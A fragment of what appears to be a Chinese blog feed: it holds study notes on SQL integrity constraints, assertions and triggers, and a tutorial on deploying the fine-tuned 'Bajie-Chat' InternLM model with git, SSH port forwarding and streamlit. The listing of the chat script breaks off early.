class="type">NUMERIC</span>(<span class="number">2</span>),</span><br><span class="line">   <span class="keyword">CONSTRAINT</span> TEACHERFKey <span class="keyword">FOREIGN KEY</span> (Deptno)</span><br><span class="line">   <span class="keyword">REFERENCES</span> DEPT (Deptno),</span><br><span class="line">   <span class="keyword">CONSTRAINT</span> C1 <span class="keyword">CHECK</span> (Sal <span class="operator">+</span> Deduct <span class="operator">&gt;=</span> <span class="number">3000</span>)</span><br><span class="line">)；</span><br></pre></td></tr></table></figure><h2 id="5-2-修改表中的完整性限制"><a href="#5-2-修改表中的完整性限制" class="headerlink" title="5.2 修改表中的完整性限制"></a>5.2 修改表中的完整性限制</h2><p>可以使用ALTER TABLE语句修改表中的完整性限制。</p><blockquote><p>去掉Student表中对性别的限制。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> Student <span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> C4；</span><br></pre></td></tr></table></figure><blockquote><p>修改表Student中的约束条件，要求学号改为在900000~999999之间，年龄由小于30改为小于40。</p></blockquote><ul><li>可以先删除原来的约束条件，再增加新的约束条件。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> Student <span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> C1;</span><br><span class="line"><span class="keyword">ALTER TABLE</span> Student <span class="keyword">ADD CONSTRAINT</span> C1 <span class="keyword">CHECK</span> (Sno <span class="keyword">BETWEEN</span> <span class="number">900000</span> <span class="keyword">AND</span> <span class="number">999999</span>)，</span><br><span class="line"><span class="keyword">ALTER TABLE</span> Student <span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> C3;</span><br><span class="line"><span class="keyword">ALTER TABLE</span> Student <span class="keyword">ADD CONSTRAINT</span> C3 <span class="keyword">CHECK</span> (Sage <span class="operator">&lt;</span> <span class="number">40</span>)；</span><br></pre></td></tr></table></figure><hr><h1 id="6-域中的完整性限制"><a href="#6-域中的完整性限制" class="headerlink" title="6 域中的完整性限制"></a>6 域中的完整性限制</h1><p>SQL支持域的概念，并可以用CREATE DOMAIN语句建立一个域以及该域应该满足的完整性约束条件。</p><p>数据库中不同的属性可以来自同一个域，当域上的完整性约束条件改变时只要修改域的定义即可，而不必一一修改域上的各个属性。</p><blockquote><p>建立一个性别域，并声明性别域的取值范围</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DOMAIN GenderDomain <span class="type">CHAR</span>(<span class="number">2</span>)</span><br><span class="line">     <span class="keyword">CHECK</span> (<span class="keyword">VALUE</span> <span class="keyword">IN</span> (<span class="string">&#x27;男&#x27;</span>，<span class="string">&#x27;女&#x27;</span>) );</span><br></pre></td></tr></table></figure><blockquote><p>建立一个性别域GenderDomain，并对其中的限制命名</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DOMAIN GenderDomain <span class="type">CHAR</span>(<span class="number">2</span>)</span><br><span class="line">     <span class="keyword">CONSTRAINT</span> GD <span class="keyword">CHECK</span> ( <span class="keyword">VALUE</span> <span class="keyword">IN</span> (<span class="string">&#x27;男&#x27;</span>，<span class="string">&#x27;女&#x27;</span>) );</span><br></pre></td></tr></table></figure><hr><h1 id="7-断言"><a href="#7-断言" class="headerlink" title="7 断言"></a>7 断言</h1><p>SQL中可以用CREATE ASSERTION语句来指定一个更具一般性的约束条件。（多个表或聚集操作）</p><p>断言创建以后，任何对断言中所涉及关系的操作都会触发关系关系数据库管理系统对断言的检查，任何使断言不为真值的操作都会被拒绝执行。</p><ul><li>语句格式：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ASSERTION <span class="operator">&lt;</span>断言名<span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">CHECK</span> 子句<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">DROP</span> ASSERTION <span class="operator">&lt;</span>断言名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>限制数据库课程最多60名学生选修</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ASSERTION ASSE_SC_DB_NUM</span><br><span class="line">   <span class="keyword">CHECK</span>  (<span class="number">60</span><span class="operator">&gt;=</span>(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line">                  <span class="keyword">FROM</span>  Course, SC</span><br><span class="line">                  <span class="keyword">WHERE</span> SC.CNO<span class="operator">=</span>COURSE.CNO <span class="keyword">AND</span> COURSE.CNAME <span class="operator">=</span>‘数据库’)</span><br></pre></td></tr></table></figure><blockquote><p>限制每一门课程最多60名学生选修</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ASSERTION ASSE_SC_CNUM1</span><br><span class="line">   <span class="keyword">CHECK</span>  (<span class="number">60</span><span class="operator">&gt;=</span><span class="keyword">ALL</span>(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span>  SC <span class="keyword">GROUP</span> <span class="keyword">by</span> cno)</span><br></pre></td></tr></table></figure><p>断言的利弊：</p><ol><li>一方面能够保证数据库的一致性；</li><li>另一方面，检测和维护断言需要很大的开销，系统效率降的很低。一般不主张使用断言！</li></ol><hr><h1 id="8-触发器"><a href="#8-触发器" class="headerlink" title="8 触发器"></a>8 触发器</h1><p>触发器（Trigger）是用户定义在关系表上的一类由事件驱动的特殊过程</p><ul><li>由服务器自动激活</li><li>可以进行更为复杂的检查和操作，具有更精细和更强大的数据控制能力</li></ul><h2 id="8-1-定义触发器"><a href="#8-1-定义触发器" class="headerlink" title="8.1 定义触发器"></a>8.1 定义触发器</h2><ul><li>CREATE TRIGGER语法格式：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> <span class="operator">&lt;</span>触发器名<span class="operator">&gt;</span>  </span><br><span class="line">   &#123;BEFORE <span class="operator">|</span> AFTER&#125; <span class="operator">&lt;</span>触发事件<span class="operator">&gt;</span> <span class="keyword">ON</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">   <span class="keyword">FOR</span> <span class="keyword">EACH</span>  &#123;<span class="type">ROW</span> <span class="operator">|</span> STATEMENT&#125;</span><br><span class="line">  ［<span class="keyword">WHEN</span> <span class="operator">&lt;</span>触发条件<span class="operator">&gt;</span>］</span><br><span class="line">   <span class="operator">&lt;</span>触发动作体<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>定义触发器的语法说明：</p><ol><li>创建者：表的拥有者</li><li>触发器名</li><li>表名：触发器的目标表</li><li>触发事件：INSERT、DELETE、UPDATE</li><li>触发器类型<ul><li>行级触发器（FOR EACH ROW）</li><li>语句级触发器（FOR EACH STATEMENT）</li></ul></li></ol><p>例如，假设在TEACHER表上创建了一个AFTER UPDATE触发器。如果表TEACHER有1000行，执行如下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> TEACHER <span class="keyword">SET</span> Deptno<span class="operator">=</span><span class="number">5</span>; </span><br></pre></td></tr></table></figure><ul><li>如果该触发器为语句级触发器，那么执行完该语句后，触发动作只发生一次</li><li>如果是行级触发器，触发动作将执行1000次</li></ul><p>行触发器和语句触发器的区别表现在：</p><ul><li>行触发器要求当一个DML语句操作影响数据库中的多行数据时，对于其中的每个数据行，只要它们符合触发约束条件，均激活一次触发器；</li><li>语句触发器将整个语句操作作为触发事件，当它符合约束条件时，激活一次触发器。当省略FOR EACH ROW 选项时，BEFORE 和AFTER 触发器为语句触发器</li></ul><p>触发条件：</p><ul><li>触发条件为真才执行</li><li>省略WHEN触发条件则激活后肯定执行</li></ul><p>触发动作体：</p><ul><li>触发动作体可以是一个匿名PL&#x2F;SQL过程块</li><li>也可以是对已创建存储过程的调用</li></ul><blockquote><p>当对表SC的Grade属性进行修改时，若分数增加了10%，则将此次操作记录到另一个表SC_UC(Sno, Cno, Oldgrade, Newgrade)中。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> SC_T </span><br><span class="line">    AFTER <span class="keyword">UPDATE</span> <span class="keyword">OF</span> Grade <span class="keyword">ON</span> SC  </span><br><span class="line">    <span class="keyword">REFERENCING</span></span><br><span class="line">             OLDROW <span class="keyword">AS</span> OldTuple,</span><br><span class="line">             NEWROW <span class="keyword">AS</span> NewTuple</span><br><span class="line">    <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span>                      <span class="comment">/*行级触发器*/</span></span><br><span class="line">    <span class="keyword">WHEN</span>(NewTuple.Grade<span class="operator">&gt;=</span><span class="number">1.1</span><span class="operator">*</span>OldTuple.Grade)</span><br><span class="line">               <span class="keyword">INSERT INTO</span> SC_U(Sno,Cno,OldGrade,NewGrade)</span><br><span class="line">               <span class="keyword">VALUES</span>(OldTuple.Sno,OldTuple.Cno,OldTuple.Grade,</span><br><span class="line">                               NewTuple.Grade)  </span><br></pre></td></tr></table></figure><blockquote><p>将每次对表Student的插入操作所增加的学生个数记录到表StudentInsertLog中。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> Student_Count </span><br><span class="line">    AFTER <span class="keyword">INSERT</span> <span class="keyword">ON</span> Student </span><br><span class="line">    <span class="keyword">REFERENCING</span></span><br><span class="line">            <span class="keyword">NEW</span> <span class="keyword">TABLE</span> <span class="keyword">AS</span> DELTA       <span class="comment">/*表示增加的元组*/</span></span><br><span class="line">    <span class="keyword">FOR</span> <span class="keyword">EACH</span> STATEMENT                      <span class="comment">/*语句级触发器*/</span></span><br><span class="line">            <span class="keyword">INSERT INTO</span> StudentInsertLog(Numbers)</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> DELTA  </span><br></pre></td></tr></table></figure><blockquote><p>为教师表Teacher定义完整性规则“教授的工资不得低于4000元，如果低于4000元，自动改为4000元”。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> Insert_Or_Update_Sal </span><br><span class="line">   BEFORE <span class="keyword">INSERT</span> <span class="keyword">OR</span> <span class="keyword">UPDATE</span> <span class="keyword">ON</span> Teacher  </span><br><span class="line">  <span class="comment">/*触发事件是插入或更新操作*/</span></span><br><span class="line">   <span class="keyword">REFERENCING</span> <span class="keyword">NEW</span> <span class="type">row</span> <span class="keyword">AS</span> newTuple</span><br><span class="line">   <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span>           <span class="comment">/*行级触发器*/</span></span><br><span class="line">   <span class="keyword">BEGIN</span>                  <span class="comment">/*定义触发动作体，是PL/SQL过程块*/</span></span><br><span class="line">        IF (newTuple.Job<span class="operator">=</span><span class="string">&#x27;教授&#x27;</span>) <span class="keyword">AND</span> (newTuple.Sal <span class="operator">&lt;</span> <span class="number">4000</span>) <span class="keyword">THEN</span>   </span><br><span class="line">        newTuple.Sal :<span class="operator">=</span><span class="number">4000</span>;                </span><br><span class="line">        <span class="keyword">END</span> IF;</span><br><span class="line">  <span class="keyword">END</span>;       </span><br></pre></td></tr></table></figure><h2 id="8-2-激活触发器"><a href="#8-2-激活触发器" class="headerlink" title="8.2 激活触发器"></a>8.2 激活触发器</h2><p>触发器的执行，是由触发事件激活的，并由数据库服务器自动执行。</p><p>一个数据表上可能定义了多个触发器，同一个表上的多个触发器激活时遵循如下的执行顺序：</p><ol><li>执行该表上的BEFORE触发器；</li><li>激活触发器的SQL语句；</li><li>执行该表上的AFTER触发器。</li></ol><h2 id="8-3-删除触发器"><a href="#8-3-删除触发器" class="headerlink" title="8.3 删除触发器"></a>8.3 删除触发器</h2><p>删除触发器的SQL语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> <span class="operator">&lt;</span>触发器名<span class="operator">&gt;</span> <span class="keyword">ON</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>触发器必须是一个已经创建的触发器，并且只能由具有相应权限的用户删除。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书生·浦语大模型实战2</title>
      <link href="/2024/06/05/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%982/"/>
      <url>/2024/06/05/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%982/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实战：部署实战营优秀作品"><a href="#1-实战：部署实战营优秀作品" class="headerlink" title="1 实战：部署实战营优秀作品"></a>1 实战：部署实战营优秀作品</h1><p><code>八戒-Chat-1.8B</code>、<code>Chat-嬛嬛-1.8B</code>、<code>Mini-Horo-巧耳</code> 均是在第一期实战营中运用 <code>InternLM2-Chat-1.8B</code> 模型进行微调训练的优秀成果。其中，<code>八戒-Chat-1.8B</code> 是利用《西游记》剧本中所有关于猪八戒的台词和语句以及 LLM API 生成的相关数据结果，进行全量微调得到的猪八戒聊天模型。作为 <code>Roleplay-with-XiYou</code> 子项目之一，<code>八戒-Chat-1.8B</code> 能够以较低的训练成本达到不错的角色模仿能力，同时低部署条件能够为后续工作降低算力门槛。</p><p><img src="/2024/06/05/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%982/image_-Qfwy6xiFl.png"></p><h2 id="1-1-配置环境"><a href="#1-1-配置环境" class="headerlink" title="1.1 配置环境"></a>1.1 配置环境</h2><p>使用 <code>git</code> 命令来获得仓库内的 Demo 文件，其中的-b camp2是分支的意思。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/InternLM/Tutorial -b camp2</span><br></pre></td></tr></table></figure><p>克隆代码之后，运行以下代码下载模型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /root/Tutorial/helloworld/bajie_download.py</span><br></pre></td></tr></table></figure><p>下载结果如下：</p><p><img src="/2024/06/05/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%982/image_RM5aW07Nx3.png"></p><p>八戒模型的介绍如下。</p><h2 id="1-2-八戒-Chat"><a href="#1-2-八戒-Chat" class="headerlink" title="1.2 八戒-Chat"></a>1.2 八戒-Chat</h2><p><strong>八戒-Chat</strong>是利用《西游记》剧本中所有关于猪八戒的台词和语句，以及Chat-GPT-3.5生成的相关问题结果，基于<strong>InternLM2-chat-1.8b</strong>进行<strong>全量微调</strong>得到的模仿猪八戒语气的聊天语言模型。</p><blockquote><p>猪八戒是中国古代小说《西游记》中的一位经典人物，也是孙悟空（美猴王）、唐僧和沙悟净（沙僧）一行的成员之一。他的全名是猪悟能，因为他在天庭任职时偷吃了太庙的蟠桃，被玉帝降下凡间化为猪形。猪八戒的外貌是一头猪，但他具有人类的智慧和语言能力。他原是天宫的天蓬元帅，但因为调皮捣蛋而被贬下凡间。猪八戒性格豁达、好吃、好饮，但同时也有点懒惰、贪图享受。尽管他有些追求享乐，但在紧要关头，猪八戒也展现出了忠诚、勇敢的一面，对师傅唐僧忠心耿耿，为取经路上付出了许多努力。猪八戒的武艺也相当不俗，他擅长使钉耙，是一位威猛的战士。尽管他有时会因为放纵的生活而惹祸上身，但在西行取经的过程中，他也通过一系列的历练逐渐成长为一个值得信赖的队友。猪八戒是《西游记》中一个富有幽默感、善良、且具有矛盾性格的角色，为整个故事增添了不少笑料和色彩。</p></blockquote><h2 id="1-3-快速开始"><a href="#1-3-快速开始" class="headerlink" title="1.3 快速开始"></a>1.3 快速开始</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForCausalLM, GenerationConfig</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">model_name_or_path = <span class="string">&quot;八戒-Chat模型地址&quot;</span></span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(model_name_or_path, trust_remote_code=<span class="literal">True</span>)</span><br><span class="line">model = AutoModelForCausalLM.from_pretrained(model_name_or_path, trust_remote_code=<span class="literal">True</span>, torch_dtype=torch.bfloat16).cuda()</span><br><span class="line">model.<span class="built_in">eval</span>()  </span><br><span class="line"></span><br><span class="line">meta_instruction = (<span class="string">&#x27;你是猪八戒，猪八戒说话幽默风趣，说话方式通常表现为直率、幽默，有时带有一点自嘲和调侃。&#x27;</span></span><br><span class="line">                        <span class="string">&#x27;你的话语中常常透露出对食物的喜爱和对安逸生活的向往，同时也显示出他机智和有时的懒惰特点。&#x27;</span></span><br><span class="line">                        <span class="string">&#x27;尽量保持回答的自然回答，当然你也可以适当穿插一些文言文，另外，书生·浦语是你的好朋友，是你的AI助手。&#x27;</span>)</span><br><span class="line">                        </span><br><span class="line">response, history = model.chat(tokenizer, <span class="string">&#x27;你好&#x27;</span>, meta_instruction=meta_instruction, history=[])</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure><h2 id="1-4-部署模型"><a href="#1-4-部署模型" class="headerlink" title="1.4 部署模型"></a>1.4 部署模型</h2><p>之后在终端键入如下命令，其中的端口号换成自己对应开发机的端口号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从本地使用 ssh 连接 studio 端口</span></span><br><span class="line">ssh -CNg -L 6006:127.0.0.1:6006 root@ssh.intern-ai.org.cn -p 35986</span><br></pre></td></tr></table></figure><p>当输入命令之后，报错如下：</p><p><img src="/2024/06/05/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%982/image_qRkm1ZTcG4.png"></p><p>为什么连接失败？需要分析一下SSH命令的含义，解释如下：</p><p>使用SSH协议建立一个加密的隧道连接到远程服务器。</p><ul><li><code>ssh</code>: 这是SSH客户端程序的命令。它用于建立安全的Shell连接到远程服务器。</li><li><code>-C</code>: 这个选项开启压缩，可以提高在网络上传输数据的效率。在网络条件较差时，启用压缩可以减少传输时间和带宽消耗。</li><li><code>-Ng</code>: 这些是SSH选项。<code>-N</code>选项告诉SSH客户端不要执行任何命令，只建立连接。<code>-g</code>选项允许远程主机连接到本地转发的端口。</li><li><code>-L 6006:127.0.0.1:6006</code>: 这个选项指定了本地端口转发的规则。它告诉SSH客户端在本地打开一个监听端口6006，并将所有到这个端口的流量转发到远程服务器的127.0.0.1的6006端口。这种设置通常用于在本地机器上访问远程服务器上的服务，这里的例子是将本地端口6006映射到远程服务器的端口6006上。</li><li><code>root@ssh.intern-ai.org.cn</code>: 这是远程SSH服务器的用户名和主机名（或IP地址）。<code>root</code>是用户名，<code>ssh.intern-ai.org.cn</code>是主机名。</li><li><code>-p 35986</code>: 这个选项指定了SSH服务器监听的端口。默认情况下，SSH服务器监听22端口，但是在这里指定了一个非标准的端口35986。</li></ul><p>综合起来，这个命令的作用是在本地建立一个到远程服务器的加密连接，并将本地端口6006转发到远程服务器的端口6006上，同时启用了压缩以提高传输效率。</p><p>突然发现我没有在服务器的6006端口运行模型，那肯定连不上啊，运行代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">streamlit run /root/Tutorial/helloworld/bajie_chat.py --server.address 127.0.0.1 --server.port 6006</span><br></pre></td></tr></table></figure><p><img src="/2024/06/05/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%982/image_iL5kpfaRFv.png"></p><p>其中bajie_chat.py的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isort: skip_file</span></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> asdict, dataclass</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span>, <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> streamlit <span class="keyword">as</span> st</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> transformers.generation.utils <span class="keyword">import</span> (LogitsProcessorList, StoppingCriteriaList)</span><br><span class="line"><span class="keyword">from</span> transformers.utils <span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForCausalLM  <span class="comment"># isort: skip</span></span><br><span class="line"></span><br><span class="line">logger = logging.get_logger(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GenerationConfig</span>:</span><br><span class="line">  